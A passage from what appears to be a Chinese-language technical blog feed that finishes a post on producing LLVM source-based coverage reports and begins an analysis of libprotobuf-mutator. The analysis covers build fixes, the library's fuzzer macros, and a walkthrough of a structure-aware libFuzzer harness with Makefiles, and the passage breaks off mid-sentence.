Indexed Profile"></a>(2) 生成 Indexed Profile</h2><p><code>/home/henices/clang7/bin/llvm-profdata merge -j=1 -sparse -o out/report/coverage.profdata out/report/*.profraw</code></p><p>-sparse 能大幅减小 profraw 文件大小</p><h2 id="3-生成-Coverage-report"><a href="#3-生成-Coverage-report" class="headerlink" title="(3) 生成 Coverage report"></a>(3) 生成 Coverage report</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">/home/henices/clang7/bin/llvm-cov show -output-dir=out/report -format=html \<br>    -Xdemangler c++filt -Xdemangler -n -instr-profile=out/report/coverage.profdata \<br>    -object=out/coverage/target<br></code></pre></td></tr></table></figure><p>打开 out&#x2F;report&#x2F;index.html 可以看到详细的 html 报告，非常不错。</p><p><img src="https://raw.githubusercontent.com/henices/pictures/master/20190118160208151_604337546.png" alt="llvm-coverge-html"></p><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><ul><li><a href="https://www.chromium.org/developers/how-tos/get-the-code/working-with-release-branches">working with release branches</a></li><li><a href="https://chromium.googlesource.com/chromium/src/+/master/docs/code_coverage.md">Code Coverage in Chromium</a></li><li><a href="http://logan.tw/posts/2015/04/28/check-code-coverage-with-clang-and-lcov/">Check Code Coverage with Clang and LCOV</a></li><li><a href="https://github.com/google/oss-fuzz/blob/master/infra/base-images/base-runner/coverage">oss-fuzz coverage</a></li><li><a href="https://clang.llvm.org/docs/SourceBasedCodeCoverage.html">Source-based Code Coverage</a></li></ul>]]></content>
    
    
    
    <tags>
      
      <tag>Security</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>libprotobuf-mutator 简单分析</title>
    <link href="/cn/libprotobuf-mutator/"/>
    <url>/cn/libprotobuf-mutator/</url>
    
    <content type="html"><![CDATA[<h2 id="What-are-protocol-buffers"><a href="#What-are-protocol-buffers" class="headerlink" title="What are protocol buffers?"></a><a href="https://developers.google.com/protocol-buffers/docs/overview">What are protocol buffers?</a></h2><p>Protocol buffers are Google’s language-neutral, platform-neutral, extensible mechanism for serializing structured data – think XML, but smaller, faster, and simpler. You define how you want your data to be structured once, then you can use special generated source code to easily write and read your structured data to and from a variety of data streams and using a variety of languages.</p><p>这段是 Google 官方网站给出的介绍，protobuf 可以自动化生成代码，用于读入或者写入结构化数据。一个简单的 protobuf 文件可以是这样的：</p><figure class="highlight protobuf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs protobuf"><span class="hljs-keyword">message </span><span class="hljs-title class_">Person</span> &#123;<br>  <span class="hljs-keyword">required</span> <span class="hljs-type">string</span> name = <span class="hljs-number">1</span>;<br>  <span class="hljs-keyword">required</span> <span class="hljs-type">int32</span> id = <span class="hljs-number">2</span>;<br>  <span class="hljs-keyword">optional</span> <span class="hljs-type">string</span> email = <span class="hljs-number">3</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>具体的语法可以参考Google 的文档 <a href="https://developers.google.com/protocol-buffers/docs/proto">proto2</a> 和 <a href="https://developers.google.com/protocol-buffers/docs/proto3">proto3</a>。c++ 语言使用 protobuf 的示例可以参见<a href="https://developers.google.com/protocol-buffers/docs/cpptutorial">Protocol Buffer Basics: C++</a> 文档，基本步骤总结如下：</p><ol><li>写 protobuf 文件，表达数据结构</li><li>利用 protoc 自动生成代码 （支持多种语言 C++ Java 等）</li><li>利用生成的文件解析或者写入相关数据结构</li></ol><h2 id="libprotobuf-mutator"><a href="#libprotobuf-mutator" class="headerlink" title="libprotobuf-mutator"></a>libprotobuf-mutator</h2><h3 id="编译安装"><a href="#编译安装" class="headerlink" title="编译安装"></a>编译安装</h3><p>参考： <a href="https://github.com/google/libprotobuf-mutator/blob/master/README.md">https://github.com/google/libprotobuf-mutator/blob/master/README.md</a></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">git <span class="hljs-built_in">clone</span> https://github.com/google/libprotobuf-mutator.git<br><span class="hljs-built_in">mkdir</span> build<br><span class="hljs-built_in">cd</span> build<br>cmake .. -GNinja -DCMAKE_C_COMPILER=clang -DLIB_PROTO_MUTATOR_DOWNLOAD_PROTOBUF=ON -DCMAKE_CXX_COMPILER=clang++ -DCMAKE_BUILD_TYPE=Debug<br>https_proxy=http://127.0.0.1:3128 ninja check<br></code></pre></td></tr></table></figure><p>由于需要从Google下载一些源码，所以在 <code>ninja check</code> 的时候需要挂上代理，结果编译出错了，找不到 <code>libxml2.a</code>，排查一下编译参数，发现需要添加编译静态库的参数</p><figure class="highlight diff"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs diff"><span class="hljs-comment">diff --git a/cmake/external/libxml2.cmake b/cmake/external/libxml2.cmake</span><br><span class="hljs-comment">index c00ace2..a944fab 100644</span><br><span class="hljs-comment">--- a/cmake/external/libxml2.cmake</span><br><span class="hljs-comment">+++ b/cmake/external/libxml2.cmake</span><br><span class="hljs-meta">@@ -38,6 +38,7 @@</span> ExternalProject_Add($&#123;LIBXML2_TARGET&#125;<br>     UPDATE_COMMAND &quot;&quot;<br>     CONFIGURE_COMMAND $&#123;LIBXML2_SRC_DIR&#125;/autogen.sh --without-python<br>                                                     --prefix=$&#123;LIBXML2_INSTALL_DIR&#125;<br><span class="hljs-addition">+                                                    --enable-static=yes</span><br>                                                     CC=$&#123;CMAKE_C_COMPILER&#125;<br>                                                     CXX=$&#123;CMAKE_CXX_COMPILER&#125;<br>                                                     CFLAGS=$&#123;LIBXML2_CFLAGS&#125;<br></code></pre></td></tr></table></figure><p>修改后可以正常通过 <code>ninja check</code> 命令的所有检查。默认情况下 <code>ninja install</code> 会安装到 &#x2F;usr&#x2F;local 目录，因为考虑到后续需要给 <code>afl+</code>使用，所以需要使用下的命令重新 cmake 一下</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">cmake .. -GNinja -DCMAKE_C_COMPILER=clang -DLIB_PROTO_MUTATOR_DOWNLOAD_PROTOBUF=ON \<br>-DCMAKE_INSTALL_PREFIX=/home/henices/code/AFL+/external/libprotobuf-mutator -DCMAKE_CXX_COMPILER=clang++ -DCMAKE_BUILD_TYPE=Debug<br></code></pre></td></tr></table></figure><h3 id="libprotobuf-mutator-代码实现"><a href="#libprotobuf-mutator-代码实现" class="headerlink" title="libprotobuf-mutator 代码实现"></a>libprotobuf-mutator 代码实现</h3><p>libfuzzer_macro.h</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">define</span> DEFINE_TEST_ONE_PROTO_INPUT_IMPL(use_binary, Proto)                 \</span><br><span class="hljs-meta">  extern <span class="hljs-string">&quot;C&quot;</span> int LLVMFuzzerTestOneInput(const uint8_t* data, size_t size) &#123; \</span><br><span class="hljs-meta">    using protobuf_mutator::libfuzzer::LoadProtoInput;                      \</span><br><span class="hljs-meta">    Proto input;                                                            \</span><br><span class="hljs-meta">    <span class="hljs-keyword">if</span> (LoadProtoInput(use_binary, data, size, &amp;input))                     \</span><br><span class="hljs-meta">      TestOneProtoInput(input);                                             \</span><br><span class="hljs-meta">    return 0;                                                               \</span><br><span class="hljs-meta">  &#125;</span><br>  <br><span class="hljs-comment">// Defines custom mutator, crossover and test functions using default</span><br><span class="hljs-comment">// serialization format. Default is text.</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> DEFINE_PROTO_FUZZER(arg) DEFINE_TEXT_PROTO_FUZZER(arg)</span><br><span class="hljs-comment">// Defines custom mutator, crossover and test functions using text</span><br><span class="hljs-comment">// serialization. This format is more convenient to read.</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> DEFINE_TEXT_PROTO_FUZZER(arg) DEFINE_PROTO_FUZZER_IMPL(false, arg)</span><br><span class="hljs-comment">// Defines custom mutator, crossover and test functions using binary</span><br><span class="hljs-comment">// serialization. This makes mutations faster. However often test function is</span><br><span class="hljs-comment">// significantly slower than mutator, so fuzzing rate may stay unchanged.</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> DEFINE_BINARY_PROTO_FUZZER(arg) DEFINE_PROTO_FUZZER_IMPL(true, arg)</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> DEFINE_PROTO_FUZZER_IMPL(use_binary, arg)                              \</span><br><span class="hljs-meta">  static void TestOneProtoInput(arg);                                          \</span><br><span class="hljs-meta">  using FuzzerProtoType = std::remove_const&lt;std::remove_reference&lt;             \</span><br><span class="hljs-meta">      std::function<span class="hljs-string">&lt;decltype(TestOneProtoInput)&gt;</span>::argument_type&gt;::type&gt;::type; \</span><br><span class="hljs-meta">  DEFINE_CUSTOM_PROTO_MUTATOR_IMPL(use_binary, FuzzerProtoType)                \</span><br><span class="hljs-meta">  DEFINE_CUSTOM_PROTO_CROSSOVER_IMPL(use_binary, FuzzerProtoType)              \</span><br><span class="hljs-meta">  DEFINE_TEST_ONE_PROTO_INPUT_IMPL(use_binary, FuzzerProtoType)                \</span><br><span class="hljs-meta">  DEFINE_POST_PROCESS_PROTO_MUTATION_IMPL(FuzzerProtoType)                     \</span><br><span class="hljs-meta">  static void TestOneProtoInput(arg)</span><br></code></pre></td></tr></table></figure><p>调用路径为 <code>DEFINE_PROTO_FUZZER</code> -&gt; <code>DEFINE_TEXT_PROTO_FUZZER</code> -&gt; <code>DEFINE_PROTO_FUZZER_IMPL</code> -&gt; <code>DEFINE_TEST_ONE_PROTO_INPUT_IMPL</code> -&gt; <code>LLVMFuzzerTestOneInput</code> -&gt; <code>TestOneProtoInput</code>。<br>最终还是实现了<code>LLVMFuzzerTestOneInput</code> libfuzzer 的入口方法，使用 macro 可以少写不少代码非常方便，从这里就可以看出 fuzz 的 target function 必须和 <code>LLVMFuzzerTestOneInput</code> 的参数类型一致</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">// fuzz_target.cc</span><br><span class="hljs-keyword">extern</span> <span class="hljs-string">&quot;C&quot;</span> <span class="hljs-type">int</span> <span class="hljs-title function_">LLVMFuzzerTestOneInput</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">uint8_t</span> *Data, <span class="hljs-type">size_t</span> Size)</span> &#123;<br>  DoSomethingInterestingWithMyAPI(Data, Size);<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;  <span class="hljs-comment">// Non-zero return values are reserved for future use.</span><br>&#125;<br></code></pre></td></tr></table></figure><p>libfuzzer_macro.cc</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-function"><span class="hljs-type">bool</span> <span class="hljs-title">LoadProtoInput</span><span class="hljs-params">(<span class="hljs-type">bool</span> binary, <span class="hljs-type">const</span> <span class="hljs-type">uint8_t</span>* data, <span class="hljs-type">size_t</span> size,</span></span><br><span class="hljs-params"><span class="hljs-function">                    protobuf::Message* input)</span> </span>&#123;<br>  <span class="hljs-keyword">if</span> (<span class="hljs-built_in">GetCache</span>()-&gt;<span class="hljs-built_in">LoadIfSame</span>(data, size, input)) <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>  <span class="hljs-keyword">auto</span> result = binary ? <span class="hljs-built_in">ParseBinaryMessage</span>(data, size, input)<br>                       : <span class="hljs-built_in">ParseTextMessage</span>(data, size, input);<br>  <span class="hljs-keyword">if</span> (!result) <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>  <span class="hljs-built_in">GetMutator</span>()-&gt;<span class="hljs-built_in">Seed</span>(size);<br>  <span class="hljs-built_in">GetMutator</span>()-&gt;<span class="hljs-built_in">Fix</span>(input);<br>  <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p><code>LoadProtoInput</code> 返回 <code>true</code> 或者 <code>false</code>，如果解析成功，将调用 <code>TestOneProtoInput</code>，<code>DEFINE_PROTO_FUZZER</code> macro 其实就是写 TestOneProtoInput 的实现。</p><h2 id="libprotobuf-mutator-fuzzing-learning"><a href="#libprotobuf-mutator-fuzzing-learning" class="headerlink" title="libprotobuf-mutator_fuzzing_learning"></a>libprotobuf-mutator_fuzzing_learning</h2><p>这是 github 上一位同行写的学习 libprotobuf-mutator fuzzing 的文章，总体写的不错，但是其中有一些错误的地方，在实践过程中都记录了其中的修改。</p><h3 id="Simple-protobuf-example"><a href="#Simple-protobuf-example" class="headerlink" title="Simple protobuf example"></a>Simple protobuf example</h3><p>文章：<a href="https://github.com/bruce30262/libprotobuf-mutator_fuzzing_learning/tree/master/1_simple_protobuf">https://github.com/bruce30262/libprotobuf-mutator_fuzzing_learning/tree/master/1_simple_protobuf</a></p><p>先写一个简单的 protobuf 文件，test.proto</p><figure class="highlight protobuf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs protobuf">syntax = <span class="hljs-string">&quot;proto2&quot;</span>;<br><br><span class="hljs-keyword">message </span><span class="hljs-title class_">TEST</span> &#123;<br>  <span class="hljs-keyword">required</span> <span class="hljs-type">uint32</span> a = <span class="hljs-number">1</span>;<br>  <span class="hljs-keyword">required</span> <span class="hljs-type">string</span> b = <span class="hljs-number">2</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>使用 <code>protoc</code> 编译 protobuf 文件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">mkdir</span> genfiles  <br>protoc ./test.proto --cpp_out=./genfiles<br></code></pre></td></tr></table></figure><p>将自动生成两个文件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">ls</span> ./genfiles<br>test.pb.cc  test.pb.h<br></code></pre></td></tr></table></figure><p>写一个测试程序 test_proto.cc</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;test.pb.h&quot;</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;bits/stdc++.h&gt;</span></span><br><br><span class="hljs-keyword">using</span> std::cin;<br><span class="hljs-keyword">using</span> std::cout;<br><span class="hljs-keyword">using</span> std::endl;<br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">char</span> *argv[])</span></span><br><span class="hljs-function"></span>&#123;<br>    TEST t;<br>    t.<span class="hljs-built_in">set_a</span>(<span class="hljs-number">101</span>);<br>    t.<span class="hljs-built_in">set_b</span>(<span class="hljs-string">&quot;testtest&quot;</span>);<br>    cout &lt;&lt; t.<span class="hljs-built_in">a</span>() &lt;&lt; endl;<br>    cout &lt;&lt; t.<span class="hljs-built_in">b</span>() &lt;&lt; endl;   <br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125; <br></code></pre></td></tr></table></figure><p>写 Makefile 来编译 <code>test_proto.cc</code></p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs makefile">CXX=clang++<br>PB_SRC=test.pb.cc<br><br>PROTOBUF_DIR=<span class="hljs-variable">$(HOME)</span>/code/libprotobuf-mutator/build/external.protobuf/<br>PROTOBUF_LIB=<span class="hljs-variable">$(PROTOBUF_DIR)</span>/lib/libprotobufd.a<br>INC=-I<span class="hljs-variable">$(PROTOBUF_DIR)</span>/<span class="hljs-keyword">include</span><br><br><span class="hljs-section">test_proto: test_proto.cc <span class="hljs-variable">$(PB_SRC)</span></span><br><span class="hljs-variable">$(CXX)</span> -o <span class="hljs-variable">$@</span> <span class="hljs-variable">$^</span> <span class="hljs-variable">$(PROTOBUF_LIB)</span> <span class="hljs-variable">$(INC)</span><br><br><span class="hljs-meta"><span class="hljs-keyword">.PHONY</span>: clean</span><br><span class="hljs-section">clean: </span><br>rm test_proto<br></code></pre></td></tr></table></figure><p>执行 <code>make</code> 后报错 .&#x2F;test.pb.h:17:2: error: This file was generated by an older version of protoc which is，因为我们在编译的时候使用了 <code>-DLIB_PROTO_MUTATOR_DOWNLOAD_PROTOBUF=ON</code> 下载了新版本的 protobuf，所以出了这个错误。只好使用下载的 protoc 重新生成 <code>test.pb.cc</code> 和 <code>test.pb.h</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">~/code/libprotobuf-mutator/build/external.protobuf/bin/protoc ./test.proto --cpp_out=./genfiles<br></code></pre></td></tr></table></figure><p>这次可以成功 make 了，实际执行的命令是</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">clang++ -o test_proto test_proto.cc test.pb.cc /home/henices/code/libprotobuf-mutator/build/external.protobuf//lib/libprotobufd.a \<br> -I/home/henices/code/libprotobuf-mutator/build/external.protobuf//include<br></code></pre></td></tr></table></figure><p>运行 <code>./test_proto</code>, 输出如下</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs">101<br>testtest<br></code></pre></td></tr></table></figure><h3 id="Combine-libprotobuf-mutator-with-libfuzzer"><a href="#Combine-libprotobuf-mutator-with-libfuzzer" class="headerlink" title="Combine libprotobuf-mutator with libfuzzer"></a>Combine libprotobuf-mutator with libfuzzer</h3><p>代码在： <a href="https://github.com/bruce30262/libprotobuf-mutator_fuzzing_learning/tree/master/2_libprotobuf_libfuzzer">https://github.com/bruce30262/libprotobuf-mutator_fuzzing_learning/tree/master/2_libprotobuf_libfuzzer</a></p><p>harness.cc</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdint.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stddef.h&gt;</span></span><br><br><span class="hljs-keyword">extern</span> <span class="hljs-string">&quot;C&quot;</span> <span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">FuzzTEST</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">uint8_t</span> *data, <span class="hljs-type">size_t</span> size)</span> </span>&#123;<br>    <span class="hljs-keyword">if</span>(data[<span class="hljs-number">0</span>] == <span class="hljs-string">&#x27;\x01&#x27;</span>) &#123;<br>        __builtin_trap();<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>其中 FuzzTEST 是我们需要测试的目标函数。</p><p>lpm_libfuzz.cc</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;libprotobuf-mutator/src/libfuzzer/libfuzzer_macro.h&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;test.pb.h&quot;</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;bits/stdc++.h&gt;</span></span><br><br><span class="hljs-keyword">using</span> std::cin;<br><span class="hljs-keyword">using</span> std::cout;<br><span class="hljs-keyword">using</span> std::endl;<br><br><span class="hljs-function">std::string <span class="hljs-title">ProtoToData</span><span class="hljs-params">(<span class="hljs-type">const</span> TEST &amp;test_proto)</span> </span>&#123;<br>    std::stringstream all;<br>    <span class="hljs-type">const</span> <span class="hljs-keyword">auto</span> &amp;aa = test_proto.<span class="hljs-built_in">a</span>();<br>    <span class="hljs-type">const</span> <span class="hljs-keyword">auto</span> &amp;bb = test_proto.<span class="hljs-built_in">b</span>();<br>    all.<span class="hljs-built_in">write</span>((<span class="hljs-type">const</span> <span class="hljs-type">char</span>*)&amp;aa, <span class="hljs-built_in">sizeof</span>(aa));<br>    <span class="hljs-keyword">if</span>(bb.<span class="hljs-built_in">size</span>() != <span class="hljs-number">0</span>) &#123;<br>        all.<span class="hljs-built_in">write</span>(bb.<span class="hljs-built_in">c_str</span>(), bb.<span class="hljs-built_in">size</span>());<br>    &#125;<br><br>    std::string res = all.<span class="hljs-built_in">str</span>();<br>    <span class="hljs-keyword">if</span> (bb.<span class="hljs-built_in">size</span>() != <span class="hljs-number">0</span> &amp;&amp; res.<span class="hljs-built_in">size</span>() != <span class="hljs-number">0</span>) &#123;<br>        <span class="hljs-comment">// set PROTO_FUZZER_DUMP_PATH env to dump the serialized protobuf</span><br>        <span class="hljs-keyword">if</span> (<span class="hljs-type">const</span> <span class="hljs-type">char</span> *dump_path = <span class="hljs-built_in">getenv</span>(<span class="hljs-string">&quot;PROTO_FUZZER_DUMP_PATH&quot;</span>)) &#123;<br>            <span class="hljs-function">std::ofstream <span class="hljs-title">of</span><span class="hljs-params">(dump_path)</span></span>;<br>            of.<span class="hljs-built_in">write</span>(res.<span class="hljs-built_in">data</span>(), res.<span class="hljs-built_in">size</span>());<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">return</span> res;<br>&#125;<br><br><span class="hljs-keyword">extern</span> <span class="hljs-string">&quot;C&quot;</span> <span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">FuzzTEST</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">uint8_t</span>* data, <span class="hljs-type">size_t</span> size)</span></span>; <span class="hljs-comment">// our customized fuzzing function</span><br><br><span class="hljs-built_in">DEFINE_PROTO_FUZZER</span>(<span class="hljs-type">const</span> TEST &amp;test_proto) &#123;<br>    <span class="hljs-keyword">auto</span> s = <span class="hljs-built_in">ProtoToData</span>(test_proto); <span class="hljs-comment">// convert protobuf to raw data</span><br>    <span class="hljs-built_in">FuzzTEST</span>((<span class="hljs-type">const</span> <span class="hljs-type">uint8_t</span>*)s.<span class="hljs-built_in">data</span>(), s.<span class="hljs-built_in">size</span>()); <span class="hljs-comment">// fuzz the function</span><br>&#125;<br></code></pre></td></tr></table></figure><p>在文件的最开头导入 <code>libfuzzer_macro.h</code>， 后面就可以使用一些宏来写代码了，<code>DEFINE_PROTO_FUZZER</code> 是关键的 fuzzer 入口。结构化变异部分 libprotobuf-mutator 已经完成了，需要实现的是一个由 protobuf 转需要的数据类型的函数，如上面的 <code>ProtoToData</code></p><h4 id="代码编译"><a href="#代码编译" class="headerlink" title="代码编译"></a>代码编译</h4><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs makefile">TARGET=lpm_libfuzz<br>CXX=clang++<br>CXXFLAGS=-g -fsanitize=fuzzer,address<br>PB_SRC=test.pb.cc<br><br>PROTOBUF_DIR=<span class="hljs-variable">$(HOME)</span>/code/libprotobuf-mutator/build/external.protobuf/<br>LPM_DIR=<span class="hljs-variable">$(HOME)</span>/code/AFL+/external/libprotobuf-mutator<br>PROTOBUF_LIB=<span class="hljs-variable">$(PROTOBUF_DIR)</span>/lib/libprotobufd.a<br>LPM_LIB=<span class="hljs-variable">$(LPM_DIR)</span>/lib/libprotobuf-mutator-libfuzzer.a <span class="hljs-variable">$(LPM_DIR)</span>/lib/libprotobuf-mutator.a<br>INC=-I<span class="hljs-variable">$(PROTOBUF_DIR)</span>/<span class="hljs-keyword">include</span> -I<span class="hljs-variable">$(LPM_DIR)</span>/<span class="hljs-keyword">include</span><br>DFUZZ=-DLLVMFuzzerTestOneInput=FuzzTEST<br><br><span class="hljs-section">all: <span class="hljs-variable">$(TARGET)</span></span><br><br><span class="hljs-comment"># for testing libprotobuf + libfuzzer</span><br><span class="hljs-comment"># compile harness first</span><br><span class="hljs-comment"># then link lpm_libfuzz with harness.o &amp; static libraries</span><br><span class="hljs-section">harness.o: harness.cc</span><br><span class="hljs-variable">$(CXX)</span> <span class="hljs-variable">$(CXXFLAGS)</span> -c <span class="hljs-variable">$(DFUZZ)</span> <span class="hljs-variable">$&lt;</span><br><br><span class="hljs-variable">$(TARGET)</span>: harness.o <span class="hljs-variable">$(TARGET)</span>.cc<br><span class="hljs-variable">$(CXX)</span> <span class="hljs-variable">$(CXXFLAGS)</span> -o <span class="hljs-variable">$@</span> <span class="hljs-variable">$^</span> <span class="hljs-variable">$(PB_SRC)</span> <span class="hljs-variable">$(LPM_LIB)</span> <span class="hljs-variable">$(PROTOBUF_LIB)</span> <span class="hljs-variable">$(INC)</span> <span class="hljs-comment"># $(LPM_LIB) must be placed before $(PROTOBUF_LIB)</span><br><br><span class="hljs-meta"><span class="hljs-keyword">.PHONY</span>: clean</span><br><span class="hljs-section">clean: </span><br>rm <span class="hljs-variable">$(TARGET)</span> *.o<br></code></pre></td></tr></table></figure><p>make 后报错，找不到头文件</p><figure class="highlight gauss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs gauss">/home/henices/<span class="hljs-built_in">code</span>/AFL+/<span class="hljs-keyword">external</span>/libprotobuf-mutator/include/libprotobuf-mutator/src/libfuzzer/libfuzzer_macro.h:<span class="hljs-number">24</span>:<span class="hljs-number">10</span>: fatal <span class="hljs-built_in">error</span>: &#x27;port/protobuf.h&#x27; file <span class="hljs-keyword">not</span> found<br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;port/protobuf.h&quot;</span></span><br>         ^~~~~~~~~~~~~~~~~<br><span class="hljs-number">1</span> <span class="hljs-built_in">error</span> generated.<br></code></pre></td></tr></table></figure><p>port&#x2F;protobuf.h  来自 <a 